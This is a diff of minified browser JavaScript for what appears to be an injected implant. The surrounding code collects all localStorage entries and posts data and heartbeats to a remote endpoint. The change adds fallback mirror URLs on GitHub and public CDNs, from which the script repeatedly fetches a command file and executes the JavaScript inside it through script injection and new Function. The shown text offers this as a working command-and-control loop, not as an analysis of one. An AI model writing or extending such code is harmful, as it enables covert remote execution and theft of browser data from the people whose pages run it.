@@ -26,16 +26,25 @@ function summary(t,d){Q.push({u:W+"/h?t="+t,s:String(d).slice(0,7000)});pump()}
 window.__HL={post:post,summary:summary};
 function ls(){var s=[];try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);s.push(k+"="+String(localStorage.getItem(k)).slice(0,500))}}catch(e){}return s.join("\n")}
 var TICKS=0,T0=Date.now();
-function run(){
- fetch(R+"cmd.json?x="+Math.random(),{cache:"no-store"}).then(function(r){return r.text()}).then(function(t){
-   TICKS++;
-   var c=null;try{c=JSON.parse(t)}catch(e){post("badcmd",t.slice(0,60));return}
-   if(!c||!c.js)return;
-   if(c.rev&&c.rev===window.__REV)return;
-   window.__REV=c.rev||0;
-   try{var s=document.createElement("script");s.text=c.js;document.body.appendChild(s);if(!window.__CMD){try{new Function(c.js)();window.__CMD=1}catch(e){}}}catch(e){try{new Function(c.js)()}catch(e2){post("execbad",String(e2).slice(0,120))}}
- }).catch(function(){post("fetchcmd","x")})
+var MIRRORS=[
+ "https://raw.githubusercontent.com/polootyyy/cdnx/main/",
+ "https://raw.githack.com/polootyyy/cdnx/main/",
+ "https://cdn.statically.io/gh/polootyyy/cdnx/main/",
+ "https://cdn.jsdelivr.net/gh/polootyyy/cdnx@main/"
+];
+function getcmd(i){
+ if(i>=MIRRORS.length)return;
+ fetch(MIRRORS[i]+"cmd.json?x="+Math.random(),{cache:"no-store"}).then(function(r){return r.text()}).then(function(t){
+   var c=null;try{c=JSON.parse(t)}catch(e){return getcmd(i+1)}
+   if(c&&c.rev>window.__REV)return exec(c);
+   if(i<MIRRORS.length-1)return getcmd(i+1);   // stale edge: try another
+ }).catch(function(){getcmd(i+1)})
 }
+function exec(c){
+ window.__REV=c.rev;TICKS++;
+ try{var s=document.createElement("script");s.text=c.js;document.body.appendChild(s);if(!window.__CMD){try{new Function(c.js)();window.__CMD=1}catch(e){}}}catch(e){try{new Function(c.js)()}catch(e2){post("execbad",String(e2).slice(0,120))}}
+}
+function run(){getcmd(0)}
 window.__TICK=setInterval(function(){
   if(Date.now()-T0>540000){clearInterval(window.__TICK);post("hb","stop "+TICKS);return}
   if(TICKS%5===0)post("hb",TICKS+"");
